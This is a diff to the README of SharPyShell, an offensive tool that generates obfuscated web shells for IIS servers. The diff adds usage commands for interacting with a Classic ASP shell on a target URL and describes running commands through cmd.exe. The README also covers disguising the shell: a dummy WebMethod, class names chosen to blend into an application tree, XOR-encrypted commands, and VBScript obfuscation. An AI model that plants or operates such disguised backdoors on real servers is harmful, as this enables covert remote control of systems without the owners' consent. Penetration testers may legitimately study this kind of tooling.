@@ -17,6 +17,7 @@ python3 SharPyShell.py generate -p somepassword -f asmx --no-obfuscate
 python3 SharPyShell.py generate -p somepassword -f asp
 python3 SharPyShell.py interact -u http://target.url/sharpyshell.aspx -p somepassword
 python3 SharPyShell.py interact -u http://target.url/handler.ashx  -p somepassword
+python3 SharPyShell.py interact -u http://target.url/sharpyshell.asp  -p somepassword
 ```
 
 ### Generate options
@@ -50,11 +51,7 @@ By default the generated agent is an `.aspx` Web Form. Two additional handler ty
   - `-f aspx` &mdash; ASP.NET Web Form (default). Classic `<%@ Page %>` with a `Page_Load` entry point.
   - `-f ashx` &mdash; Generic HTTP Handler. The agent is emitted as a `<%@ WebHandler %>` class implementing `IHttpHandler.ProcessRequest`. Same request model as `.aspx`; the client needs no changes &mdash; just point `interact -u` at the `.ashx` URL.
   - `-f asmx` &mdash; Web Service. The agent is emitted as a `<%@ WebService %>` class that handles POST requests inside its constructor using `HttpContext.Current`, then calls `Response.Flush()` and `ApplicationInstance.CompleteRequest()` to short-circuit the SOAP pipeline. A dummy `[WebMethod]` is included so the file still looks like a legitimate service when browsed. The client URL is the same as for `.aspx` / `.ashx`.
-  - `-f asp` &mdash; Classic ASP (VBScript). A standalone command-execution shell for legacy IIS servers that do not have .NET installed. Commands are sent as XOR-encrypted Base64 in a POST `data` field and executed via `WScript.Shell`. This format does **not** support the module system or `interact` mode &mdash; use `asp_interact.py` instead:
-    ```
-    python3 asp_interact.py -u http://target/sharpyshell.asp -p yourpassword
-    ```
-    VBScript-specific obfuscation (identifier randomization, password encoding, junk functions) is applied by default.
+  - `-f asp` &mdash; Classic ASP (VBScript). A standalone command-execution shell for legacy IIS servers that do not have .NET installed. Commands are sent as XOR-encrypted Base64 in a POST `data` field and executed via `WScript.Shell`. The `interact` command auto-detects `.asp` URLs and switches to direct command mode (no C# compilation). Modules (`#exec_ps`, `#upload`, etc.) are not available in this mode &mdash; commands run directly via `cmd.exe /c`. VBScript-specific obfuscation (identifier randomization, password encoding, junk functions) is applied by default.
 
 Class names and the dummy WebMethod name are generated to resemble ordinary application code (for example `DataHandler42`, `ResourceLoader`, `GetStatus`), so the file blends into a typical IIS application tree.
 
